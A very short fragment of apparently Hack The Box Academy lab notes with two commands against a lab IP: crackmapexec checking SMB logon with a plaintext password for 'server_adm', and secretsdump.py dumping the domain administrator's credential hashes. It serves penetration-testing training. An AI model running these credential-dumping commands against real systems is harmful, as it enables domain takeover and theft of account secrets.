...
```shell-session
xF1NN@htb[/htb]$ crackmapexec smb 10.129.43.9 -u server_adm -p 'HTB_@cademy_stdnt!'
...
```shell-session
xF1NN@htb[/htb]$ secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator
